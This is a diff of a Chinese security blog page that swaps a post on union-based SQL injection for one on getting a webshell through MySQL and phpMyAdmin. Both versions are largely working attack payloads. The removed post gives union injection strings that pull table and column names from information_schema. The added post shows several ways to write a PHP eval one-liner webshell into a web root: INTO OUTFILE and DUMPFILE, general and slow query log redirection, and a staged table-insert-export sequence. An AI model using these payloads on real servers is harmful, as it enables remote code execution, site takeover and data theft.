@@ -4,13 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="union联合注入, f14g">
-    <meta name="description" content="1.判断是否存在漏洞用单引号或者双引号判断是否报错。若报错则存在sql注入漏洞
-2.判断是字符型的还是数字型漏洞输入    
-1&#39; and 1=2#
-
-如果与原来只输入  1   的结果相同则是数字
-3.判断select几列用  order">
+    <meta name="keywords" content="phpmyadmin后台mysqlgetshell姿势, f14g">
+    <meta name="description" content="获取网站物理路径getshell我们首先要知道网站的物理路径
+通过报错信息可以通过输入不存在的路径或者其他报错方法使网站报错有可能报出绝对or相对路径
+通过phpinfo()获取路径在phpinfo页面直接搜索：DOCUMENT_ROOT
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +20,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>union联合注入 | f14g</title>
+    <title>phpmyadmin后台mysqlgetshell姿势 | f14g</title>
     <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
     
 
@@ -276,12 +274,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/images/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/images/62.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">union联合注入</h1>
+                    <h1 class="description center-align post-title">phpmyadmin后台mysqlgetshell姿势</h1>
                 </div>
             </div>
         </div>
@@ -305,8 +303,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/union%E8%81%94%E5%90%88/">
-                                <span class="chip bg-color">union联合</span>
+                            <a href="/tags/getshell%E5%A7%BF%E5%8A%BF/">
+                                <span class="chip bg-color">getshell姿势</span>
                             </a>
                         
                     </div>
@@ -317,12 +315,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Web/" class="post-category">
-                                Web
-                            </a>
-                        
-                            <a href="/categories/Web/Sql/" class="post-category">
-                                Sql
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                渗透
                             </a>
                         
                     </div>
@@ -334,28 +328,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-02-02
+                    2023-07-27
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-07-23
+                    2023-07-27
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    474
+                    515
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -378,37 +372,63 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="1-判断是否存在漏洞"><a href="#1-判断是否存在漏洞" class="headerlink" title="1.判断是否存在漏洞"></a>1.判断是否存在漏洞</h3><p>用单引号或者双引号判断是否报错。若报错则存在sql注入漏洞</p>
-<h3 id="2-判断是字符型的还是数字型漏洞"><a href="#2-判断是字符型的还是数字型漏洞" class="headerlink" title="2.判断是字符型的还是数字型漏洞"></a>2.判断是字符型的还是数字型漏洞</h3><p>输入    </p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <h2 id="获取网站物理路径"><a href="#获取网站物理路径" class="headerlink" title="获取网站物理路径"></a>获取网站物理路径</h2><p>getshell我们首先要知道网站的物理路径</p>
+<h3 id="通过报错信息"><a href="#通过报错信息" class="headerlink" title="通过报错信息"></a>通过报错信息</h3><p>可以通过输入不存在的路径或者其他报错方法使网站报错有可能报出绝对or相对路径</p>
+<h3 id="通过phpinfo-获取路径"><a href="#通过phpinfo-获取路径" class="headerlink" title="通过phpinfo()获取路径"></a>通过phpinfo()获取路径</h3><p>在phpinfo页面直接搜索：DOCUMENT_ROOT</p>
+<h3 id="查看数据库路径"><a href="#查看数据库路径" class="headerlink" title="查看数据库路径"></a>查看数据库路径</h3><p>如果目标站点是利用phpstudy、Xampp、LAMPP等之类搭建的</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%datadir%'</span><span class="token punctuation">;</span>
+或者
+<span class="token keyword">select</span> @<span class="token variable">@basedir</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p>如果与原来只输入  1   的结果相同则是数字</p>
-<h3 id="3-判断select几列"><a href="#3-判断select几列" class="headerlink" title="3.判断select几列"></a>3.判断select几列</h3><p>用  order  by</p>
-<p>如果order by  被过滤了可以用group by</p>
-<h3 id="4-获取数据库名"><a href="#4-获取数据库名" class="headerlink" title="4.获取数据库名"></a>4.获取数据库名</h3><p>假设这里select的是3列  然后需要自己在判断一下哪几位是回显位  然后用联合注入查询 数据库</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="getshell姿势"><a href="#getshell姿势" class="headerlink" title="getshell姿势"></a>getshell姿势</h2><h3 id="select-into-outfile直接写入"><a href="#select-into-outfile直接写入" class="headerlink" title="select into outfile直接写入"></a>select into outfile直接写入</h3><p>利用条件：<br>1.知道网站的绝对路径<br>2.secure_file_priv不能为null<br>3.具有写入文件的权限</p>
+<p>查看secure_file_priv是否为null</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">global</span> variables <span class="token operator">like</span> <span class="token string">'%secure_file_priv%'</span><span class="token punctuation">;</span>
+<span class="token operator">or</span>
+<span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%secure%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="5-获取数据库表名"><a href="#5-获取数据库表名" class="headerlink" title="5.获取数据库表名"></a>5.获取数据库表名</h3><pre class="line-numbers language-none"><code class="language-none">在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。 其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表， 表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际 上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。
-SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果 取之此表。
-TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个
-schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的 结果取之此表。
-COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是
-show columns from schemaname.tablename的结果取之此表。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>写一句话木马</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'&lt;?php @eval($_POST[cmd]);?>'</span><span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'C:\\phpstudy\\www\\shell.php'</span>
+或者
+<span class="token keyword">select</span> <span class="token string">'&lt;?php @eval($_POST[cmd]);?>'</span><span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'C:/phpstudy/www/shell.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-
-
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="6-获取表中的字段名"><a href="#6-获取表中的字段名" class="headerlink" title="6.获取表中的字段名"></a>6.获取表中的字段名</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>' <span class="token operator">and</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="7-查询字段中的内容"><a href="#7-查询字段中的内容" class="headerlink" title="7.查询字段中的内容"></a>7.查询字段中的内容</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span><span class="token punctuation">,</span> <span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token keyword">from</span> biaoming<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'&lt;?php phpinfo();?>'</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'C:\phpstudy\www\shell.php'</span><span class="token operator">%</span><span class="token number">23</span>
+?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'&lt;?php phpinfo();?>'</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'C:\phpstudy\www\shell.php'</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 
 
-<p>group_concat()  函数是让多行数据在一行显示   如果被过滤  可以利用</p>
-<pre class="line-numbers language-none"><code class="language-none">limit 0,1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="开启全局日志getshell"><a href="#开启全局日志getshell" class="headerlink" title="开启全局日志getshell"></a>开启全局日志getshell</h3><p>general_log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。可以尝试自定义日志文件，并向日志文件里面写入内容的话</p>
+<p>查看当前日志文件：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">'general%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p>开启日志记录</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token string">"ON"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p>更改日志文件路径</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file<span class="token operator">=</span><span class="token string">'C:\\phpstudy\\www\\shell.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>往日志文件里写入一句话木马</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">"&lt;?php @eval($_POST['cmd']);?>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="使用慢查询日志getsehll"><a href="#使用慢查询日志getsehll" class="headerlink" title="使用慢查询日志getsehll"></a>使用慢查询日志getsehll</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%slow%'</span>
+ 
+<span class="token keyword">set</span> <span class="token keyword">global</span> slow_query_log<span class="token operator">=</span><span class="token keyword">on</span><span class="token punctuation">;</span>
+ 
+<span class="token keyword">set</span> <span class="token keyword">global</span> slow_query_log_file<span class="token operator">=</span><span class="token string">'C:\\phpstudy\\www\\shell.php'</span>
+ 
+<span class="token keyword">select</span> <span class="token string">"&lt;?php @eval($_POST['cmd']);?>"</span> <span class="token operator">or</span> sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="使用错误日志getshell"><a href="#使用错误日志getshell" class="headerlink" title="使用错误日志getshell"></a>使用错误日志getshell</h3><p>查看错误日志</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">'log_error'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后通过写带sql语法错误的一句话木马实现报错，然后getshell</p>
+<h3 id="利用phpmyadmin4-8-x本地文件包含漏洞getshell"><a href="#利用phpmyadmin4-8-x本地文件包含漏洞getshell" class="headerlink" title="利用phpmyadmin4.8.x本地文件包含漏洞getshell"></a>利用phpmyadmin4.8.x本地文件包含漏洞getshell</h3><h3 id="创建数据库和表写入"><a href="#创建数据库和表写入" class="headerlink" title="创建数据库和表写入"></a>创建数据库和表写入</h3><p>有root权限、网站绝对路径已知（并且确定有写入权限）; secure_file_priv没有具体值</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> test<span class="token punctuation">(</span> id <span class="token keyword">text</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
+ 
+<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> test <span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'&lt;?php @eval($_POST[cmd]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
+ 
+<span class="token keyword">SELECT</span> id <span class="token keyword">FROM</span> test <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'C:\\xampp\\htdocs\\tieuhoc\\e.php'</span>；    
+ 
+<span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token keyword">EXISTS</span> test；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
                 
@@ -436,7 +456,7 @@ show columns from schemaname.tablename的结果取之此表。<span aria-hidden=
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2023/02/02/union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/">http://example.com/2023/02/02/union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</a>
+                    <a href="http://example.com/2023/07/27/phpmyadmin%E5%90%8E%E5%8F%B0mysqlgetshell%E5%A7%BF%E5%8A%BF/">http://example.com/2023/07/27/phpmyadmin%E5%90%8E%E5%8F%B0mysqlgetshell%E5%A7%BF%E5%8A%BF/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -474,8 +494,8 @@ show columns from schemaname.tablename的结果取之此表。<span aria-hidden=
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/union%E8%81%94%E5%90%88/">
-                                    <span class="chip bg-color">union联合</span>
+                                <a href="/tags/getshell%E5%A7%BF%E5%8A%BF/">
+                                    <span class="chip bg-color">getshell姿势</span>
                                 </a>
                             
                         </div>
@@ -765,16 +785,17 @@ show columns from schemaname.tablename的结果取之此表。<span aria-hidden=
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">
+                <a href="/2023/07/27/phpmyadmin%E5%90%8E%E5%8F%B0mysqlgetshell%E5%A7%BF%E5%8A%BF/">
                     <div class="card-image">
                         
-                        <img src="/images/20.jpg" class="responsive-img" alt="堆叠注入">
+                        <img src="/images/62.jpg" class="responsive-img" alt="phpmyadmin后台mysqlgetshell姿势">
                         
-                        <span class="card-title">堆叠注入</span>
+                        <span class="card-title">phpmyadmin后台mysqlgetshell姿势</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -784,30 +805,27 @@ show columns from schemaname.tablename的结果取之此表。<span aria-hidden=
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-02-02
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-27
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Web/" class="post-category">
-                                    Web
-                                </a>
-                            
-                            <a href="/categories/Web/Sql/" class="post-category">
-                                    Sql
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                    渗透
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">
-                        <span class="chip bg-color">堆叠注入</span>
+                    <a href="/tags/getshell%E5%A7%BF%E5%8A%BF/">
+                        <span class="chip bg-color">getshell姿势</span>
                     </a>
                     
                 </div>
@@ -821,12 +839,12 @@ show columns from schemaname.tablename的结果取之此表。<span aria-hidden=
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/02/02/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">
+                <a href="/2023/07/26/proxychains/">
                     <div class="card-image">
                         
-                        <img src="/images/20.jpg" class="responsive-img" alt="绕过技巧">
+                        <img src="/images/61.jpg" class="responsive-img" alt="proxychains">
                         
-                        <span class="card-title">绕过技巧</span>
+                        <span class="card-title">proxychains</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -837,18 +855,14 @@ show columns from schemaname.tablename的结果取之此表。<span aria-hidden=
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-02
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-26
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Web/" class="post-category">
-                                    Web
-                                </a>
-                            
-                            <a href="/categories/Web/Sql/" class="post-category">
-                                    Sql
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                    渗透
                                 </a>
                             
                             
@@ -858,8 +872,8 @@ show columns from schemaname.tablename的结果取之此表。<span aria-hidden=
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/sql/">
-                        <span class="chip bg-color">sql</span>
+                    <a href="/tags/proxychains/">
+                        <span class="chip bg-color">proxychains</span>
                     </a>
                     
                 </div>
@@ -1020,13 +1034,6 @@ show columns from schemaname.tablename的结果取之此表。<span aria-hidden=
 
 </main>
 
-
-<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-<script>
-    MathJax.Hub.Config({
-        tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
-    });
-</script>
 
 
 
